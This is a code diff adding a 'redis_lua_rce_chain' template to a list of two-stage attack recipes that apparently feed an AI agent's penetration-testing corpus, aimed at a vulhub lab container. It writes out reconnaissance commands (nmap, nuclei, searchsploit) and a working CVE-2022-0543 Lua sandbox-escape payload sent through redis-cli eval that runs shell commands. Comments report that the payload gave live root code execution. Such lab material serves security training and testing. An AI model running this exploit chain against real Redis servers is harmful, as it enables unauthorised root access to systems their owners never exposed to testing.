@@ -935,6 +935,87 @@ TWO_STAGE_TEMPLATES = [
         ],
     },
     {
+        # redis_lua_rce_chain -- third "grind through vulhub one at a
+        # time" recipe (after wp2shell_full_chain, es_groovy_rce_chain).
+        # Targets redis/CVE-2022-0543 (Lua sandbox escape RCE, a Debian/
+        # Ubuntu packaging bug in the bundled liblua that leaves
+        # `package.loadlib` reachable from an unauthenticated `EVAL`).
+        # Single container, port 6379, no HTTP surface at all -- a THIRD
+        # distinct chain shape in this file (wp2shell: broad web-app tool
+        # spread; es_groovy: one HTTP endpoint via curl; this one: a
+        # binary-protocol service via its own CLI client, no curl/HTTP
+        # tool involved anywhere).
+        #
+        # redis-cli was NOT installed on kali-agent-box before this recipe
+        # (confirmed live: `which redis-cli` returned nothing) -- installed
+        # via `apt-get install -y redis-tools`, now added to CLAUDE.md's
+        # cold-start package list and `bd memories
+        # gotcha-kali-package-list-for-execution-target`. Any fresh/
+        # rebuilt exec target needs this package before this recipe (or
+        # any future redis-targeting one) will work.
+        #
+        # LIVE-VERIFIED manually before templating (this file's established
+        # habit): confirmed real root RCE -- `redis-cli -h <target> eval
+        # '<lua sandbox escape>' 0` returned `uid=0(root) gid=0(root)
+        # groups=0(root)` directly. nuclei needed a NETWORK-category
+        # target spec (`-target {target}:6379`, plain host:port, no
+        # `http://`) rather than the `http://{target}` form
+        # es_groovy_rce_chain/wp2shell_full_chain use -- confirmed by
+        # checking the template lives under nuclei-templates' `network/`
+        # tree, not `http/`, before guessing at invocation syntax the way
+        # wp2shell_full_chain's first nuclei attempt did. `-tags redis`
+        # (confirmed via `grep tags:` on the real installed template)
+        # matched this recipe's own target CVE plus a genuinely large
+        # bonus haul run live: `exposed-redis`, a live `redis-info` dump,
+        # THREE further real 2025 CVEs this exact 5.0.7 build is also
+        # vulnerable to (CVE-2025-46817/46818/46819/49844), and confirmed
+        # no-password unauthenticated access via `redis-default-logins`.
+        #
+        # `condition_check` matches stage_1's `REDIS_CHECK:PONG` marker --
+        # same first-thing-printed reasoning as WPJSON_CHECK/ES_CHECK in
+        # the other two chains in this file, for the same 300-char-
+        # truncation reason.
+        "template_id": "redis_lua_rce_chain",
+        "verified": True,
+        "condition_check": "REDIS_CHECK:PONG",
+        "stage_1": [
+            {
+                "tool": "run_command",
+                "command": (
+                    "echo \"REDIS_CHECK:$(redis-cli -h {target} ping)\" ; "
+                    "timeout 30 nmap -sV -p6379 {target} "
+                    "| tee /tmp/redis_nmap.txt >/dev/null ; "
+                    "timeout 60 nuclei -target {target}:6379 -tags redis -silent "
+                    "| tee /tmp/redis_nuclei.txt ; "
+                    "searchsploit redis 2>&1 | tee /tmp/redis_searchsploit.txt"
+                ),
+            },
+        ],
+        "stage_2": [
+            {
+                "tool": "run_command",
+                "command": (
+                    "echo \"--- lua sandbox RCE: id ---\" ; "
+                    "timeout 30 redis-cli -h {target} eval "
+                    "\"local io_l = package.loadlib("
+                    "\\\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\\\", \\\"luaopen_io\\\"); "
+                    "local io = io_l(); local f = io.popen(\\\"id\\\", \\\"r\\\"); "
+                    "local res = f:read(\\\"*a\\\"); f:close(); return res\" 0 ; "
+                    "echo \"--- lua sandbox RCE: whoami ---\" ; "
+                    "timeout 30 redis-cli -h {target} eval "
+                    "\"local io_l = package.loadlib("
+                    "\\\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\\\", \\\"luaopen_io\\\"); "
+                    "local io = io_l(); local f = io.popen(\\\"whoami\\\", \\\"r\\\"); "
+                    "local res = f:read(\\\"*a\\\"); f:close(); return res\" 0"
+                ),
+            },
+            {"tool": "run_metasploit", "commands": "search redis lua"},
+        ],
+        "variations": [
+            {"target": "172.27.0.2"},
+        ],
+    },
+    {
         # STRUCTURED run_medusa call in stage_2 -- medusa had ZERO
         # examples anywhere in the corpus before this template (one of
         # the 4 tools README's Known Gaps calls out by name). Genuinely
